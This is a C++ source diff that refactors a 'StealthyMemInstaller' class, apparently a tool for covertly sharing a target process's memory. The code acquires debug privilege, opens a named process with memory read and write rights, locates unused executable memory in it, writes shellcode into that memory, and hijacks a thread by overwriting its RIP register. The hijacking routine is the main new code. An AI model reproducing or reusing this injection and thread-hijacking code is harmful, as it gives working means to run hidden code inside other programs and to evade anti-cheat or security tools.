@@ -31,69 +31,40 @@ BOOL StealthyMemInstaller::Install() {
 	if (InstanceAlreadyRunning()) {
         cout << "Install() failed: Instance already running." << endl;
         return FALSE;
-    }
+	}
+	
+	if (AlreadyInstalled()) {
+		cout << "Install() failed: already installed." << endl;
+        return TRUE;
+	}
 
     if (!SetProcessPrivilege(SE_DEBUG_NAME, TRUE)) {
         cout << "Install() failed: Privilege failed." << endl;
         return FALSE;
     }
-    
-    vector<DWORD> pidsTargetProcess = GetPIDsOfProcess(targetProcessName);
-	if (pidsTargetProcess.empty()) {
-        cout << "Install() failed: no PIDs found." << endl;
-        return FALSE;
-    }
-    // in case the target process has multiple PIDs, take the first one
-    sort(pidsTargetProcess.begin(), pidsTargetProcess.end());
-    targetProcessPID = pidsTargetProcess[0];
-	if (!targetProcessPID) {
-        cout << "Install() failed: Invalid PID." << endl;
+	
+	if (!GetTargetProcessPID()) {
+        cout << "Install() failed: GetTargetProcessPID failed." << endl;
         return FALSE;
     }
 
-    // Check for already existing installations
-	hSharedMemHandle = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, sharedMemName.c_str());
-	if (hSharedMemHandle) {
-        cout << "Install() failed: already installed." << endl;
-        return TRUE; // Already installed
-    }
-
-    hTargetProcess = OpenProcess(
-        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-        FALSE,
-        targetProcessPID
-    );
-	if (!hTargetProcess) {
-        cout << "Install() failed: Cannot open process. " << GetLastError() << endl;
+    if (!GetTargetProcessHandle()) {
+		cout << "Install() failed: GetTargetProcessHandle failed." << endl;
         return FALSE;
-    }
+	}
 
-    vector<UNUSED_EXECUTABLE_MEM> availableExecutableMem = FindExecutableMemory(hTargetProcess, TRUE);
-    if (availableExecutableMem.empty() || 
-        availableExecutableMem[0].start == nullptr || 
-        availableExecutableMem[0].size == NULL ||
-        availableExecutableMem[0].size <= PADDING_IN_EXECUTABLE_MEM
-    ) {
-        cout << "Install() failed: No avaiable mem." << endl;
+    if (!GetRemoteExecutableMemory()) {
+		cout << "Install() failed: GetRemoteExecutableMemory failed." << endl;
         return FALSE;
-    }
-    remoteExecutableMem = (void*)((DWORD64)availableExecutableMem[0].start + PADDING_IN_EXECUTABLE_MEM);
-    remoteExecutableMemSize = availableExecutableMem[0].size - PADDING_IN_EXECUTABLE_MEM;
+	}
 	
 	if (!FindUsableTID()) {
-		cout << "Install() failed: No TID found." << endl;
-		return FALSE;
-	}
-	
-	hTargetThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetTID);
-	if (!hTargetThread) {
-		cout << "Install() failed: could not open thread." << endl;
+		cout << "Install() failed: FindUsableTID failed." << endl;
 		return FALSE;
 	}
 
-	// Creating shared memory
 	if (!CreateSharedFileMapping()) {
-		cout << "Install() failed: SharedFileMApping failed." << endl;
+		cout << "Install() failed: CreateSharedFileMapping failed." << endl;
 		return FALSE;
 	}
 
@@ -102,8 +73,6 @@ BOOL StealthyMemInstaller::Install() {
 	// 	return FALSE;
 	// }
 
-
-	
 		
     return TRUE;
 }
@@ -118,9 +87,61 @@ BOOL StealthyMemInstaller::InstanceAlreadyRunning() {
         // An instance of either the installer or the client is already running, terminate now
         return TRUE; 
 
-    } else {
+	}
+	return FALSE;
+}
+
+BOOL StealthyMemInstaller::GetTargetProcessPID() {
+	vector<DWORD> pidsTargetProcess = GetPIDsOfProcess(targetProcessName);
+	if (pidsTargetProcess.empty()) {
+        cout << "Install() failed: no PIDs found." << endl;
         return FALSE;
     }
+    // in case the target process has multiple PIDs, take the first one
+    sort(pidsTargetProcess.begin(), pidsTargetProcess.end());
+    targetProcessPID = pidsTargetProcess[0];
+	if (!targetProcessPID) {
+        cout << "Install() failed: Invalid PID." << endl;
+        return FALSE;
+	}
+	return TRUE;
+}
+
+BOOL StealthyMemInstaller::AlreadyInstalled() {
+	hSharedMemHandle = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, sharedMemName.c_str());
+	if (hSharedMemHandle) {
+        cout << "Install() failed: already installed." << endl;
+        return TRUE;
+	}
+	return FALSE;
+}
+
+BOOL StealthyMemInstaller::GetTargetProcessHandle() {
+	hTargetProcess = OpenProcess(
+        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+        FALSE,
+        targetProcessPID
+    );
+	if (!hTargetProcess) {
+        cout << "Install() failed: Cannot open process. " << GetLastError() << endl;
+        return FALSE;
+	}
+	return TRUE;
+}
+
+BOOL StealthyMemInstaller::GetRemoteExecutableMemory() {
+	vector<UNUSED_EXECUTABLE_MEM> availableExecutableMem = FindExecutableMemory(hTargetProcess, TRUE);
+    if (availableExecutableMem.empty() || 
+        availableExecutableMem[0].start == nullptr || 
+        availableExecutableMem[0].size == NULL ||
+        availableExecutableMem[0].size <= PADDING_IN_EXECUTABLE_MEM
+    ) {
+        cout << "Install() failed: No avaiable mem." << endl;
+        return FALSE;
+    }
+    remoteExecutableMem = (void*)((DWORD64)availableExecutableMem[0].start + PADDING_IN_EXECUTABLE_MEM);
+	remoteExecutableMemSize = availableExecutableMem[0].size - PADDING_IN_EXECUTABLE_MEM;
+	return TRUE;
 }
 
 
@@ -242,6 +263,13 @@ BOOL StealthyMemInstaller::FindUsableTID() {
 	if (!targetTID) {
 		return FALSE; // Could not find any of the threads starting in one of the target modules
 	}
+
+	hTargetThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetTID);
+	if (!hTargetThread) {
+		cout << "Install()::FindUsableTID() failed: could not open thread." << endl;
+		return FALSE;
+	}
+
 	return TRUE;
 }
 
@@ -347,22 +375,20 @@ BOOL StealthyMemInstaller::ConnectFileMappingWithTargetThread() {
 	CopyMemory((void*)addrEndOfShellCode, lpNameBuffer, sizeof(lpNameBuffer));
 	addrEndOfShellCode += sizeof(lpNameBuffer);
  
-	// Calculating full size of shellcode
 	SIZE_T fullShellcodeSize = addrEndOfShellCode - (DWORD64)rwMemory;
  
-	// Placing pointer to the buffer integrated with the shellcode containing the name
 	DWORD64 lpNameInRemoteExecMemory = (DWORD64)remoteExecutableMem + fullShellcodeSize - sizeof(lpNameBuffer);
 	CopyMemory((void*)((DWORD64)rwMemory + 12), &lpNameInRemoteExecMemory, sizeof(lpNameInRemoteExecMemory));
  
-	bool pushShellcodeStatus = PushShellcode(rwMemory, fullShellcodeSize);
+	// bool pushShellcodeStatus = PushShellcode(rwMemory, fullShellcodeSize);
+	BOOL pushShellcodeStatus = WriteProcessMemoryAtPtrLocation(hTargetProcess, remoteExecutableMem, rwMemory, fullShellcodeSize);
 	VirtualFree(rwMemory, 0, MEM_RELEASE);
 	if (!pushShellcodeStatus) {
 		return FALSE;
 	}
 		
  
-	if (!ExecWithThreadHiJacking(fullShellcodeSize - sizeof(lpNameBuffer), false)) {
-		// The shellcode ends before since the end is just memory
+	if (!ExecShellcodeWithHijackedThread(fullShellcodeSize - sizeof(lpNameBuffer), FALSE)) {
 		return FALSE;
 	} 
  
@@ -376,5 +402,45 @@ BOOL StealthyMemInstaller::ConnectFileMappingWithTargetThread() {
 }
 
 BOOL StealthyMemInstaller::ExecShellcodeWithHijackedThread(SIZE_T shellcodeSize, bool thenRestore) {
+	// Preparing for thread hijacking
+	CONTEXT tcInitial;
+	CONTEXT tcHiJack;
+	CONTEXT tcCurrent;
+	SecureZeroMemory(&tcInitial, sizeof(CONTEXT));
+	tcInitial.ContextFlags = CONTEXT_ALL;
+ 
+	// Suspend thread and send it executing our shellcode
+	DWORD suspendCount = SuspendThread(hTargetThread);
+	if (suspendCount > 0) {
+		// The thread was already suspended
+		for (int i = 0; i < suspendCount; ++i) {
+			ResumeThread(hTargetThread);
+		}
+	} 
+	GetThreadContext(hTargetThread, &tcInitial);
+	CopyMemory(&tcHiJack, &tcInitial, sizeof(CONTEXT)); // Faster than another call to GetThreadContext
+	CopyMemory(&tcCurrent, &tcInitial, sizeof(CONTEXT));
+	tcHiJack.Rip = (DWORD64)remoteExecutableMem;
+	SetThreadContext(hTargetThread, &tcHiJack);
+	ResumeThread(hTargetThread);
+ 
+	if (shellcodeSize == NULL) {
+		return TRUE; // Permanent thread hijack, do not wait for any execution completion
+	}
+		
+ 
+	// Check the thread context to know when done executing (RIP should be at memory address + size of shellcode - 2 in the infinite loop jmp rel8 -2)
+	DWORD64 addrEndOfExec = (DWORD64)remoteExecutableMem + shellcodeSize - 2;
+	do {
+		GetThreadContext(hTargetThread, &tcCurrent);
+	} while (tcCurrent.Rip != addrEndOfExec);
+ 
+	if (thenRestore) {
+		// Execution finished, resuming previous operations
+		SuspendThread(hTargetThread);
+		SetThreadContext(hTargetThread, &tcInitial);
+		ResumeThread(hTargetThread);
+	}
+ 
 	return TRUE;
 }
